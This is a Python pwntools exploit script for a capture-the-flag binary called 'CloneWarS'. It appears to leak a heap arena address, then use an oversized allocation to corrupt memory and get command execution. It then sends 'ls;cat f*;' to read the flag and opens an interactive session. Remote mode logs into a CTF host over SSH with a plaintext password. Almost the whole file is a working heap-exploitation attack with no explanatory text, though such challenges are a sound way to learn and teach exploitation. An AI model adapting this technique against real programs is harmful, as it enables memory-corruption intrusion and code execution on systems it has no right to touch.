from pwn import *
context.log_level = 'debug'

TARGET = './CloneWarS'
HOST = ''
PORT = 0 

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        # return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        return process(TARGET, stdout=process.PTY, stdin=process.PTY)

    else:
        print "remote" 
        # return remote(HOST, PORT)
        return process('sh', stdout=process.PTY, stdin=process.PTY)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set follow-fork-mode parent\n"
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r = start()
if args.D:
    debug(r, []) 

if args.R:
    r.sendline('ssh yeet@ctf2.kaf.sh -p 7000')
    r.sendlineafter('password:', '12345678')

r.sendlineafter('choice: ', '3')
r.sendlineafter(': ', '24')
r.sendlineafter(': ', 'ff')
r.sendlineafter(': ', '32')

r.sendlineafter('choice: ', '2')
r.sendlineafter('R2? ', 'hoge')
r.recvuntil('R2D2 IS .... ')
arena_top = int(r.recvuntil(' ')[:-1]) - 0x100 + 8
dbg("arena_top")

r.sendlineafter('choice: ', '6')
r.recvuntil('File is at: ')
target = int(r.recvuntil('\n')[:-1])

r.sendlineafter('choice: ', '1')
r.sendlineafter('choice: ', '1')
r.sendlineafter(': ', '24')

r.sendlineafter('choice: ', '5')
r.sendlineafter(': ', str(target - arena_top-0x30))
r.sendlineafter(': ', 'AAAAAAAA')

r.sendlineafter('choice: ', '5')
r.sendlineafter(': ', '24')
r.sendline('')
r.sendlineafter(': ', 'ls;cat f*;')
r.sendlineafter('choice: ', '6')
r.interactive()

